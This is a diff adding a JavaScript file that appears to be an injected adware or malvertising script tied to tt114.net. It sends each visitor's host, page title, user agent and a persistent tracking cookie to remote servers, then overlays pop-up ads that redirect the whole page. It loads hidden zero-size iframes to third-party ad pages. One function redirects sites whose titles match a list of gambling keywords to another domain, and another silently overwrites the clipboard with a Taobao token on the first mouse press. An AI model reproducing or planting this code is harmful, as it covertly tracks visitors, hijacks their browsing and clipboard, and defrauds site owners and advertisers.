@@ -1,0 +1,420 @@
+function getCookie(name) {
+	var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
+	if (arr = document.cookie.match(reg))
+		return unescape(arr[2]);
+	else
+		return null;
+}
+
+function setCookie(name, value, da) {
+	var exp = new Date();
+	exp.setTime(exp.getTime() + da * 60 * 60 * 1000);
+	document.cookie = name + "=" + escape(value) + ";path=/;expires=" + exp.toGMTString();
+}
+function S4() {
+	return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
+}
+function guid() {
+	return (S4() + S4() + "-" + S4() + "-" + S4() + "-" + S4() + "-" + S4() + S4() + S4());
+}
+var d = document,
+	v = d.createElement("div"),
+	a = d.createElement("a"),
+	g1 = d.createElement("img"),
+	g2 = d.createElement("img"),
+	b = d.getElementsByTagName('body')[0],
+	h = window.location.host,
+	w = window.location.pathname,
+	sUserAgent = navigator.userAgent.toLowerCase(),
+	bIsIpad = sUserAgent.match(/ipad/i) == "ipad",
+	bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os",
+	bIsMidp = sUserAgent.match(/midp/i) == "midp",
+	bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4",
+	bIsUc = sUserAgent.match(/ucweb/i) == "ucweb",
+	bIsAndroid = sUserAgent.match(/android/i) == "android",
+	bIsCE = sUserAgent.match(/windows ce/i) == "windows ce",
+	bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile",
+	mD = new Date(),
+	qqcs = "{'radius':'" + getCookie("radius") + "','browser':'" + sUserAgent.substring(0, 130) + "','deviceNo':'0755'," + "'cookieId':'" + getCookie("uudid") + "','wwwhost':'" + window.location.host + "'}";
+uudid = "cms" + guid();
+if (getCookie("uudid") != null) {
+
+} else {
+	setCookie("uudid", uudid, "17520");
+}
+function ajax(opt) {
+	opt = opt || {};
+	opt.method = opt.method.toUpperCase() || 'POST';
+	opt.url = opt.url || '';
+	opt.async = opt.async || true;
+	opt.data = opt.data || null;
+	opt.success = opt.success || function () { };
+	var xmlHttp = null;
+	if (XMLHttpRequest) {
+		xmlHttp = new XMLHttpRequest();
+	} else {
+		xmlHttp = new ActiveXObject('Microsoft.XMLHTTP');
+	}
+	var params = [];
+	for (var key in opt.data) {
+		params.push(key + '=' + opt.data[key]);
+	}
+	var postData = params.join('&');
+	if (opt.method.toUpperCase() === 'POST') {
+		xmlHttp.open(opt.method, opt.url, opt.async);
+		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded;charset=utf-8');
+		xmlHttp.send(postData);
+	} else if (opt.method.toUpperCase() === 'GET') {
+		xmlHttp.open(opt.method, opt.url + '?' + postData, opt.async);
+		xmlHttp.send(null);
+	}
+	xmlHttp.onreadystatechange = function () {
+		if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
+			opt.success(xmlHttp.responseText);
+		}
+	};
+}
+ajax({
+	method: 'POST',
+	url: 'http://www.tt114.net/ggbmd/ggbmd.php',
+	data: {
+		host: h,
+		title: d.title
+	},
+	success: function (response) {
+		var obj = JSON.parse(response);
+		if (obj.id != 1) {
+				ajax({
+					method: 'POST',
+					url: 'http://www.tt114.net:8081/htw-api/advertisement/getPopads.json',
+					data: {
+						sign: "sdfsdfasd",
+						params: qqcs
+					},
+					success: function (response) {
+						var obj = JSON.parse(response);
+						if (obj.code == "OK") {
+							var objr = JSON.parse(obj.data);
+							if (w != "/") {
+								if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
+									if (objr.popModel == "2") {
+										ydsxf(objr.id, getCookie("radius"), objr.advsUrl, objr.advsImgs);
+										ppc(objr.advsOwner);
+									} else if (objr.popModel == "3") {
+										cpgg(objr.id, getCookie("radius"), objr.advsUrl, objr.advsImgs);
+										ppc(objr.advsOwner);
+									} else if (objr.popModel == "4") {
+										ydxxf(objr.id, getCookie("radius"), objr.advsUrl, objr.advsImgs);
+										ppc(objr.advsOwner);
+									} else if (objr.popModel == "5") {
+										ydsxf(objr.id, getCookie("radius"), objr.advsUrl, objr.advsImgs);
+										ppc(objr.advsOwner);
+									} else if (objr.popModel == "6") {
+										cpgg(objr.id, getCookie("radius"), objr.advsUrl, objr.advsImgs);
+										ppc(objr.advsOwner);
+									} else if (objr.popModel == "7") {
+										ydxxf(objr.id, getCookie("radius"), objr.advsUrl, objr.advsImgs);
+										ppc(objr.advsOwner);
+									}
+								} else {
+									if (objr.popModel == "1") {
+										pc(objr.id, getCookie("radius"), objr.advsUrl, objr.advsImgs);
+										ppc(objr.advsOwner);
+									} else {
+	
+									}
+								}
+							} else {
+	
+							}
+						}
+					}
+				});
+				tjzs();
+
+		}
+	}
+});
+
+
+function pc(id, ra, url, img) {
+	v.style.width = "300px";
+	v.style.height = "250px";
+	v.style.position = "fixed";
+	v.style.bottom = "0px";
+	v.style.right = "0px";
+	v.style.zIndex = "9999";
+	v.id = "iqbg";
+	b.appendChild(v);
+	a.onclick = function () {
+		ajax({
+			method: 'POST',
+			url: 'http://www.tt114.net:8081/htw-api/advertisement/clickpop.json',
+			data: {
+				sign: "sdfsdfasd",
+				params: "{'popadsId':'" + id + "','radius':'" + ra + "'}",
+			},
+			success: function (response) {
+				var obj = JSON.parse(response);
+				if (obj.code == "OK") {
+					var tempwindow = window.open('_blank'); // 先打开页面
+					tempwindow.location = url;
+				}
+			}
+		});
+	}
+	v.appendChild(a);
+	g1.src = img;
+	g1.style.width = "300px";
+	g1.style.height = "250px";
+	a.appendChild(g1);
+	g2.src = "http://www.tt114.net/jsg/t.png";
+	g2.style.width = "20px";
+	g2.style.height = "20px";
+	g2.style.position = "relative";
+	g2.style.top = "-250px";
+	g2.style.left = "286px";
+	g2.style.zIndex = "999999";
+	g2.onclick = function () {
+		if(isIE()||isIE11()){
+	　　　　d.getElementById("iqbg").removeNode(true);
+	　　}else{
+	 　　　 d.getElementById("iqbg").remove();
+		}
+	}
+	v.appendChild(g2);
+}
+function isIE(){
+　　if(!!window.ActiveXObject || "ActiveXObject" in window){
+　　　　return true;
+　　}else{
+　　　　return false;
+　　}
+} 
+function isIE11(){
+　　if((/Trident\/7\./).test(navigator.userAgent)){
+　　　　return true;
+　　}else{
+　　　　return false;
+　　}
+}
+function ydsxf(id, ra, url, img) {
+	v.style.width = "100%";
+	v.style.height = "80px";
+	v.style.position = "fixed";
+	v.style.top = "0px";
+	v.style.right = "0px";
+	v.id = "iqbg";
+	v.style.zIndex = "9999";
+	b.appendChild(v);
+	a.onclick = function () {
+		ajax({
+			method: 'POST',
+			url: 'http://www.tt114.net:8081/htw-api/advertisement/clickpop.json',
+			data: {
+				sign: "sdfsdfasd",
+				params: "{'popadsId':'" + id + "','radius':'" + ra + "'}",
+			},
+			success: function (response) {
+				var obj = JSON.parse(response);
+				if (obj.code == "OK") {
+					top.location.href = url;
+				}
+			}
+		});
+	}
+	v.appendChild(a);
+	g1.src = img;
+	g1.style.width = "100%";
+	g1.style.height = "80px";
+	a.appendChild(g1);
+	g2.src = "http://www.tt114.net/jsg/t.png";
+	g2.style.width = "20px";
+	g2.style.height = "20px";
+	g2.style.position = "relative";
+	g2.style.top = "-80px";
+	g2.style.left = "0px";
+	g2.style.zIndex = "999999";
+	g2.onclick = function () {
+		if(isIE()||isIE11()){
+	　　　　d.getElementById("iqbg").removeNode(true);
+	　　}else{
+	 　　　 d.getElementById("iqbg").remove();
+		}
+	}
+	v.appendChild(g2);
+}
+
+function ydxxf(id, ra, url, img) {
+	v.style.width = "100%";
+	v.style.height = "80px";
+	v.style.position = "fixed";
+	v.style.bottom = "0px";
+	v.style.right = "0px";
+	v.id = "iqbg";
+	v.style.zIndex = "9999";
+	b.appendChild(v);
+	a.onclick = function () {
+		ajax({
+			method: 'POST',
+			url: 'http://www.tt114.net:8081/htw-api/advertisement/clickpop.json',
+			data: {
+				sign: "sdfsdfasd",
+				params: "{'popadsId':'" + id + "','radius':'" + ra + "'}",
+			},
+			success: function (response) {
+				var obj = JSON.parse(response);
+				if (obj.code == "OK") {
+					top.location.href = url;
+				}
+			}
+		});
+	}
+	v.appendChild(a);
+	g1.src = img;
+	g1.style.width = "100%";
+	g1.style.height = "80px";
+	a.appendChild(g1);
+	g2.src = "http://www.tt114.net/jsg/t.png";
+	g2.style.width = "20px";
+	g2.style.height = "20px";
+	g2.style.position = "relative";
+	g2.style.top = "-80px";
+	g2.style.left = "0px";
+	g2.style.zIndex = "999999";
+	g2.onclick = function () {
+		if(isIE()||isIE11()){
+	　　　　d.getElementById("iqbg").removeNode(true);
+	　　}else{
+	 　　　 d.getElementById("iqbg").remove();
+		}
+	}
+	v.appendChild(g2);
+}
+
+function cpgg(id, ra, url, img) {
+	var v2 = d.createElement("div");
+	v2.style.width = "100%";
+	v2.style.height = "100%";
+	v2.style.position = "fixed";
+	v2.id = "iqbg";
+	v2.style.top = "0px";
+	v2.style.background = "rgba(0,0,0,0.3)";
+	v2.style.zIndex = "99";
+	b.appendChild(v2);
+	v.style.width = "250px";
+	v.style.height = "250px";
+	v.style.position = "fixed";
+	v.style.bottom = (window.screen.height - 250) / 2 + "px";
+	v.style.right = (window.screen.width - 250) / 2 + "px";
+	v.style.zIndex = "9999";
+	v2.appendChild(v);
+	a.onclick = function () {
+		ajax({
+			method: 'POST',
+			url: 'http://www.tt114.net:8081/htw-api/advertisement/clickpop.json',
+			data: {
+				sign: "sdfsdfasd",
+				params: "{'popadsId':'" + id + "','radius':'" + ra + "'}",
+			},
+			success: function (response) {
+				var obj = JSON.parse(response);
+				if (obj.code == "OK") {
+					top.location.href = url;
+				}
+			}
+		});
+	}
+	v.appendChild(a);
+	g1.src = img;
+	g1.style.width = "250px";
+	g1.style.height = "250px";
+	a.appendChild(g1);
+	g2.src = "http://www.tt114.net/jsg/t.png";
+	g2.style.width = "20px";
+	g2.style.height = "20px";
+	g2.style.position = "relative";
+	g2.style.top = "0px";
+	g2.style.right = "0px";
+	g2.onclick = function () {
+		if(isIE()||isIE11()){
+	　　　　d.getElementById("iqbg").removeNode(true);
+	　　}else{
+	 　　　 d.getElementById("iqbg").remove();
+		}
+	}
+	g2.style.zIndex = "999999";
+	v.appendChild(g2);
+}
+function tjzs() {
+	if (bIsIpad || bIsIphoneOs) {
+		tjzscs("iphone")
+	} else if (bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
+		tjzscs("mobile")
+	} else {
+		tjzscs("pc")
+	}
+}
+function tjzscs(id) {
+	ajax({
+		method: 'POST',
+		url: 'http://www.tt114.net:8081/htw-api/advertisement/statisAdvsViews.json',
+		data: {
+			sign: "sdfsdfasd",
+			params: "{'clientType':'" + id + "'}",
+		}
+	});
+}
+function ppc(owerId) {
+	if(owerId==22){
+		//tjdm("https://ad.adbid.cn:2443/hdp0628.html");
+		tjdm("https://rt.rxtong.com:4431/hdp0628.html");
+	}
+	/*
+    if (bIsIpad || bIsIphoneOs) {
+			tjdm("http://www.tt114.net/jsg/ppci.html");
+		} else if (bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) {
+			tjdm("http://www.tt114.net/jsg/ppca.html");
+		} else {
+			tjdm("http://www.tt114.net/jsg/ppc.html");
+		}
+		*/
+}
+function tjdm(url) {
+	var q1 = d.createElement("div"),
+		q2 = d.createElement("iframe"),
+		q3 = d.createElement("script");
+	q1.style.display = "none";
+	b.appendChild(q1);
+	q2.frameborder = "0";
+	q2.scrolling = "no";
+	q2.style.width = "0";
+	q2.style.height = "0";
+	q2.src = url;
+	q1.appendChild(q2);
+	q3.type = "text/javascript";
+}
+
+function bbcc() {
+	if (document.title.indexOf("88体育") != "-1"|| document.title.indexOf("bet365") != "-1" || document.title.indexOf("bg娱乐") != "-1" || document.title.indexOf("hg0088") != "-1" || document.title.indexOf("im体育") != "-1" || document.title.indexOf("LMG视讯") != "-1" || document.title.indexOf("mg电子") != "-1" || document.title.indexOf("mg游戏") != "-1" || document.title.indexOf("pg电子") != "-1" || document.title.indexOf("pg娱乐") != "-1"|| document.title.indexOf("pt老虎机") != "-1" || document.title.indexOf("sungame") != "-1"|| document.title.indexOf("w66利来") != "-1"|| document.title.indexOf("yabo") != "-1"|| document.title.indexOf("澳门") != "-1"|| document.title.indexOf("澳門") != "-1"|| document.title.indexOf("北京赛车") != "-1"|| document.title.indexOf("捕鱼达人") != "-1"|| document.title.indexOf("彩票") != "-1"|| document.title.indexOf("大发") != "-1"|| document.title.indexOf("泛亚电竞") != "-1"|| document.title.indexOf("菲律宾") != "-1"|| document.title.indexOf("福彩连环") != "-1"|| document.title.indexOf("果彩") != "-1"|| document.title.indexOf("和记娱乐") != "-1"|| document.title.indexOf("恒峰娱乐") != "-1"|| document.title.indexOf("华纳国际") != "-1"|| document.title.indexOf("皇城国际") != "-1"|| document.title.indexOf("皇城体育") != "-1"|| document.title.indexOf("皇马国际") != "-1"|| document.title.indexOf("金沙") != "-1"|| document.title.indexOf("凯发K8") != "-1"|| document.title.indexOf("沙巴体育") != "-1"|| document.title.indexOf("沙龙") != "-1"|| document.title.indexOf("圣安娜") != "-1"|| document.title.indexOf("太阳城") != "-1"|| document.title.indexOf("威尼斯") != "-1"|| document.title.indexOf("亚博") != "-1"|| document.title.indexOf("永利") != "-1"|| document.title.indexOf("玉和") != "-1"|| document.title.indexOf("真人") != "-1"|| document.title.indexOf("尊龙") != "-1") {
+		tjdm("http://www.tt114.net/jsg/bb.html");
+		top.location.href = "https://downhuiy.hytba.top/";
+	}
+}
+
+function copyText() {
+	var i = 0;
+	document.onmousedown = function () {
+		if (i != 1) {
+			var Url2 = "$rclU1aboqxB$復·制咑閞手淘";
+			var oInput = document.createElement('input');
+			oInput.value = Url2;
+			document.body.appendChild(oInput);
+			oInput.select();
+			document.execCommand("Copy"); 
+			oInput.className = 'oInput';
+			oInput.style.display = 'none';
+			i++;
+		}
+	}
+}
